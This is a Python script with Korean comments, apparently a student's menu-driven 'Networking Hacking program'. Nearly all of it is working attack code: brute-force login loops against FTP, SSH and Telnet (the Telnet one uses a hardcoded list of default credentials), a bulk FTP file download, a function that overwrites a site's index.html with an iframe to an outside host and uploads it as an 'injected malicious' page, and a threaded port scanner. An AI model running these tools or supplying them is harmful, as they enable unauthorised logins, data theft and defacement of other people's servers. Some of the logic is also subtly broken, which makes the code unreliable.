import ftplib, time
import os 
import getpass
import queue
import threading
import ipaddress
import socket
import paramiko
from paramiko import SSHClient, AutoAddPolicy
import logging
import time
import getpass
import telnetlib
import time
import sys



# 로딩과 선택지 관련 클래스
class opening():
    # 로딩 애니메이션 과 썸네일 
    def loading(self):
        a="============================================="
        l = list(a)
        print(len(a))
        print(a)
        for i in range(len(a)):
            os.system("clear")
            print("Loding...")
            l[i] = '*'
            a = "".join(l)
            print(a)
            time.sleep(0.02)
        os.system("clear")
        print("Welcome to the Networking Hacking program!!! \n")
        print(" h     h      aa        ccccc     k   k   ")
        print(" h     h    a   a      c     c    k  k    ")
        print(" hhhhhhh   a     a    c           kkk     ")
        print(" h     h    a     a    c     c    k  k    ")
        print(" h     h     aaaa  a    ccccc     k   k   \n")

        
        
    #기본 선택지    
    def index(self):    
        print("\nservice-------------")
        print("1.호스트 , 포트 스캔")
        print("2.SSH 관련 공격")
        print("3.FTP 관련 공격")
        print("4.TELNET 관련 공격")
        print("--------------------\n")
        
        select = int(input("select number : "))
    
    
    
    
        #스캔 관련 설정
        if select == 1:
            print("Scan")

        #ssh 관련 설정        
        if select == 2:
            print("2.ssh 관련 공격")
            print("\nservice-------------")
            print("1.bruteLogin")
            #print("2.filedownload")
            #print("3.injectPage")
            print("--------------------\n")
            select1 = int(input("select number : "))
            
            if select1 == 1:
                print("1.bruteLogin")
                SSH().bruteLogin()
                opening().con()

        #ftp 관련 설정
        if select == 3:
            print("3.FTP 관련 공격")
            print("\nservice-------------")
            print("1.bruteLogin")
            print("2.filedownload")
            print("3.injectPage")
            print("--------------------\n")
            select1 = int(input("select number : "))
            
            #ftp.bruteLogin  
            if select1 == 1:
                print("1.bruteLogin")
                FTP().bruteLogin()
                opening().con()
            
            #ftp.filedownload    
            if select1 == 2:
                print("2.filedownload")
                FTP().get_list_ftp()
                opening().con()
            
            #ftp.injection     
            if select1 == 3:
                print("3.injectPage") 
                FTP().injectPage()    
                opening().con()
        
        #telnet 관련 설정    
        if select == 4:
            TELNET().bruteLogin()
            opening().con()          
        
            
            
    #스캔이나 공격이 끝난 후에 프로그램을 계속할 것 인지        
    def con(self):
        ans=input("Continue the program? Y/N :")
        if ans =="y" or ans =="Y" :
            opening().index()
        else:
            print("Thank you ~~~~~~~~")     
            sys.exit(0)
            
            
            
#ftp 관련 클래스                    
class FTP():
    
    #ftp.bruteLogin  
    def bruteLogin(self):
        hostname = input("input host ip : ")
        passwdFile = 'userpass.txt'
        pF = open(passwdFile, 'r')
        for line in pF.readlines():
            time.sleep(1)
            userName = line.split(':')[0]
            passWord = line.split(':')[1].strip('\r').strip('\n')
            print ("[+] Trying: "+userName+"/"+passWord)
            try:
                ftp = ftplib.FTP(hostname)
                ftp.login(userName, passWord)
                print ('[*] ' + str(hostname) + ' FTP Logon Succeeded: '+userName+"/"+passWord)
                ftp.quit()
                return (userName, passWord)
            except Exception as e:
                pass
        print ('[-] Could not brute force FTP credentials.')
        return (None, None)
            
    #ftp.filedownload        
    def get_list_ftp(self):
        host=input("input host ip : ")
        ftp = ftplib.FTP(host)
        user=input("input user id : ")
        passwd = getpass.getpass("Input passWord : ")
        ftp.login(user, passwd)
        print("이동할 곳을 눌러주세요 설정이 끝나면 exit 를 눌러주세요")
        print("ex) /home/s120180366/public_html/")
        pwd=ftp.pwd()
        print("현재위치 >> ",pwd)
        while True:
            a=input(">>")
            if a=="exit":
                break
            chdir = ftp.cwd(a)
            pwd=ftp.pwd()
            print(pwd)
        data=[]
        files=[]
        directories=[]
        ftp.dir(data.append)
        for item in data:
            pos = item.rfind(' ')
            name = item[pos+1:]
            if item[:1] == 'd':
                directories.append(name)
            else:
                files.append(name)
        
        for item in files:
            f = open(item, "wb")
            res = ftp.retrbinary("RETR " + item, f.write)
            print(res)
            f.close()            
            
    #ftp.injection 
    def injectPage(self):
        host = input("Input host : ")
        userName = input("Input userName : ")
        passWord = getpass.getpass("Input passWord : ")              
        ftp = ftplib.FTP(host)
        ftp.login(userName, passWord)
        pwd=ftp.pwd()
        print(pwd)
        chdir = ftp.cwd("/home/"+userName+"/public_html") 
        #chdir = ftp.cwd("/var/www/html") 
        print(chdir)
        nlst = ftp.nlst()
        print(nlst)
        redirect = '<iframe src = "http://is.woosuk.ac.kr"></iframe>'
        page='index.html'
        
        
        f = open(page + '.tmp', 'w')
        ftp.retrlines('RETR ' + page, f.write)
        print ('[+] Downloaded Page: ' + page)
        f.close()
   
        f=open(page + '.tmp', 'w')
        f.write(redirect)
        f.close()
        print ('[+] Injected Malicious IFrame on: ' + page)
    
        f = open(page + '.tmp', 'rb')
        ftp.storlines('STOR ' + page, f)
        print ('[+] Uploaded Injected Page: ' + page)



#ssh 관련 클래스
class SSH():
    #ssh.bruteLogin 
    def bruteLogin(self):
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(AutoAddPolicy())
        passwdFile = 'userpass.txt'
        server = input("Server : ")
        pF = open(passwdFile, 'r')

        for line in pF.readlines():
            userName = line.split(':')[0]
            passWord = line.split(':')[1].strip('\r').strip('\n')
            try:
                idx = ssh.connect(server, port=22, username=userName, password=passWord)
            except:
                idx = 0;

            if idx is None:   
                print('success',userName ," : " , passWord)
                break
            else:
                print('faild', userName ," : " , passWord)
                time.sleep(0.3)
       
            ssh.close()
       
         
#telnet 관련 클래스        
class TELNET():
    #telnet.bruteLogin
    def bruteLogin(self):
        host1 = input("Input host : ")

        ##telnet.bruteLogin 는 외부 파일이 아니라 리스트를 이용
        SERVER = [
                    (host1, 'root1', '123456'),
                    (host1, 'bar', 'bar1234'),
                    (host1, 'administrator', 'password'),
                    (host1, 'admin', '12345'),
                    (host1, 'guest', 'guest'),
                    (host1, 'testuser', '123456'),
                    (host1, 'testuser1', '123456'),   
                     ]
        
        for host, user, password in SERVER:
            tn = telnetlib.Telnet(host)
            tn.read_until(b"login: ")
            print("[+] Trying: ",user , password ,"---->",end="")
            tn.write(user.encode('utf-8') + b'\n')

            tn.read_until(b"Password: ")
            tn.write(password.encode('utf-8') + b'\n')

            tn.write(b'free\n')
            tn.write(b'exit\n') 
            print(tn.read_all())
            



#호스트 포트 스캔
def hostscan(target):
    ports = [21,22,23, 53, 80, 443, 3306]    
    alive = os.system("ping -c 1 " + str(target) + " > /dev/null")
    if alive == 0:
        for port in ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex((str(target), port))
            if result == 0:
                print("Target host " + str(target) + " is up -----> Port " + str(port) + " is opened")
            sock.close()
    
            
            
            
            
def worker():
    while True:
        target = q.get()
        if target is None:
            break
        hostscan(target)
        q.task_done()


if __name__ == '__main__':
    #로딩 이펙트
    opening().loading()
    
    #기본창 
    opening().index()
    
    print("특정 네트워크 주소의 작동중인 모든 호스트와 열려 있는 포트를 스캔합니다")    
    print("Enter network address : ")
    hOst=input("ex) 10.10.10.0/24 , 192.168.55.0/24 : ") 
        
    
    q = queue.Queue()
    threads = []
    for i in range(30):
        t = threading.Thread(target = worker)
        t.setDaemon(True)
        t.start()
        threads.append(t)
    ip_range = list(ipaddress.ip_network(hOst))
    for host in ip_range[1:50]:
        q.put(host)
    q.join()
    for i in range(30):
        q.put(None)
    for t in threads:
        t.join()
    opening().con()
   
   
    
